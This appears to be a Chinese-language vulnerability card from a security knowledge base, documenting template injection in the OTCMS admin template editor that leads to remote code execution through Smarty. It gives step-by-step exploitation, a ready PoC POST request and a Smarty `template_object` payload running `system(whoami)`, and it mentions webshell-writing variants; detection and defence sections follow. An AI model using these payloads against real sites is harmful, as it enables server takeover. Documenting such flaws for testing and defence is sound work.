---
id: web-generic-ssti-otcms-admin-template-smarty-rce
title: OTCMS 后台模板管理直接写入 Smarty 模板触发 SSTI：{otcms:} 前缀表达式求值，template_object 载荷执行 system 命令
type: scenario
domain: web
path: web/generic/ssti
technique: otcms-smarty-template-edit-rce
aliases:
- OTCMS SSTI
- 网钛CMS 模板注入
- template_deal AddOrRevFile
- otcms 模板标签
- Smarty template_object CVE-2021-26119
tags:
- php
- smarty
- ssti
- rce
- otcms
- cms
- template-edit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V578
  verified_at: '2026-11-12T12:26:05+08:00'
  notes: 已对照原文12875全文与截图核对：后台模板管理AddOrRevFile、fileContent未过滤、扩展名白名单html|htm|shtml|css|js|txt|xml|wml、File::Write、{otcms:7*7}回显49、Smarty版本4.3.2、template_object载荷写入、whoami回显、POST mudi=revFile&sel=pc&nohrefStr=close 均与截图一致；单漏洞单链，原子。CVE-2021-26119编号与4.3.2版本对应关系未独立核实，卡内已注明且cve留空。PoC未本机复跑。
---

## 一句话结论

OTCMS（网钛CMS）后台“模板管理”的 `AddOrRevFile()` 把 POST 的 `fileContent` 原样写入模板文件，未做任何 SSTI 防护；模板使用 Smarty（原文环境 4.3.2）且自定义标签前缀为 `{otcms:`，写入 `{otcms:7*7}` 可确认表达式求值，写入 `{otcms:$smarty.template_object->smarty->_getSmartyObj()->display('string:otcms:system(whoami)')}` 即可在首页渲染时执行系统命令。

## 原理

- **入口**：后台模板管理保存请求 `/admin/template_deal.php?mudi=revFile&sel=pc` 进入 `admin/template_deal.php#AddOrRevFile()`。该方法从 POST 读取 `backURL`、`dataType`、`dataTypeCN`、`dataMode`、`dataModeStr`、`sel`、`isBak`、`isEmptyRow`、`isNoEmptyRow`、`filePath`、`fileName`、`fileContent` 等参数，校验文件名/路径（禁止 `..`、扩展名白名单 `html|htm|shtml|css|js|txt|xml|wml`、后台权限），随后 `File::Write($filePath, $fileContent)` 写入模板文件。对 `fileContent` 没有任何针对模板语法的过滤。
- **模板引擎行为**：OTCMS 页面由 Smarty 渲染，业务标签以 `{otcms:` 开头（模板中可见 `{otcms:include file="top.html"}`）。`{otcms:7*7}` 被编译执行、首页输出 `49`；`{otcms:$smarty.version}` 输出 4.3.2。
- **RCE 链**：模板内可访问 `$smarty.template_object`（Smarty 模板对象），通过 `->smarty->_getSmartyObj()` 取回引擎对象，再调用 `display('string:otcms:system(whoami)')` 以字符串模板方式再次渲染；字符串模板中的 `otcms:system(whoami)` 被当作业务标签执行 PHP `system`，命令输出直接显示在首页。原文将该 template_object 逃逸归为 CVE-2021-26119。
- **为什么成立**：模板编辑功能等价于"可控代码写入 + 服务端渲染"；Smarty 对模板对象/内部方法的暴露使攻击者能在模板表达式里调用引擎自身 API，绕过普通函数调用限制；写入后首页下次渲染即触发，无需重启。
- 注意：原文截图显示 Smarty 版本 4.3.2，而 CVE-2021-26119 官方修复版本早于 4.x；卡内按原文载荷记录，未独立验证该 CVE 编号与版本的对应关系，实际以目标环境回显为准。

## 触发条件

- 已登录 OTCMS 后台（模板管理 → 模板文件编辑），或通过其它漏洞取得后台会话。
- 目标模板目录可写（`File::Write` 成功），且修改的模板文件（如 `../template/default/index.html`）会被前台渲染。
- 模板内容通过 Smarty 解析，业务标签前缀为 `{otcms:`；目标环境与原文一致或相近。
- 命令执行受 PHP `disable_functions`、Web 进程权限限制。

## 利用步骤

1. 登录后台，进入“模板功能 → 模板管理”，选择当前模板的 `index.html`（路径 `../template/default/index.html`）。
2. 在文件内容中写入 `{otcms:7*7}` 保存，访问首页确认输出 `49`，证明模板表达式可执行。
3. 写入 `{otcms:$smarty.version}` 确认 Smarty 版本（原文回显 4.3.2）。
4. 写入 RCE 载荷：`{otcms:$smarty.template_object->smarty->_getSmartyObj()->display('string:otcms:system(whoami)')}`，保存。
5. 访问首页，命令输出（原文为 `...\administrator`）出现在页面上；可替换 `whoami` 为任意命令。
6. 清理：恢复原模板内容；若创建了备份文件按需删除。

## PoC

保存请求（`fileContent` 为 URL 编码后的载荷）：

```http
POST /admin/template_deal.php?mudi=revFile&sel=pc&nohrefStr=close HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: <后台会话>

filePath=default%2Findex.html&fileName=index.html&fileContent=%7Botcms%3A%24smarty.template_object-%3Esmarty-%3E_getSmartyObj%28%29-%3Edisplay%28%27string%3Aotcms%3Asystem%28whoami%29%27%29%7D
```

模板载荷（明文）：

```smarty
{otcms:7*7}
{otcms:$smarty.template_object->smarty->_getSmartyObj()->display('string:otcms:system(whoami)')}
```

说明：原文通过后台界面保存并访问首页得到 `49` 与 `whoami` 回显；PoC 未在本机复跑。

## 变体与关联

- 变体：`AddOrRevFile` 同时支持新建/修改模板文件（`mudi=add/revFile`），扩展名白名单含 `js/css/txt/xml/wml`，可写入其它会被引用的资源；换用其它 Smarty 内部类/模板对象方法可构造写 webshell 或读文件载荷。
- 关联：Smarty 3 直接 RCE 与 Smarty 4/5 内部 API 绕过见 [[web-generic-ssti-smarty-direct-rce-v4-v5-bypass]]；后台模板编辑类 SSTI 与 JFinalCMS Enjoy 模板编辑、Joomla 模板编辑器写 shell 同属"模板编辑即代码执行"模式。
- 边界：需要后台权限；目标改用了安全模板引擎/沙箱或对 `fileContent` 做语法过滤时链不成立；`disable_functions` 禁用 `system` 需换其它函数或写文件。

## 检测与防御

- 检测：模板文件内容中出现 `{otcms:` 后跟 `$smarty`、`template_object`、`system(`、`display('string:` 等特征；后台模板保存请求的 `fileContent` 含模板标签；模板文件被非运维账号修改；首页响应中出现命令输出/异常 PHP 报错。
- 防御：模板编辑功能仅对超级管理员开放并加二次认证/审计；对 `fileContent` 做模板语法白名单或禁用 `$smarty` 对象访问；升级 Smarty 并启用沙箱/安全模式；模板目录最小写权限与文件完整性监控；`disable_functions` 收敛危险函数。
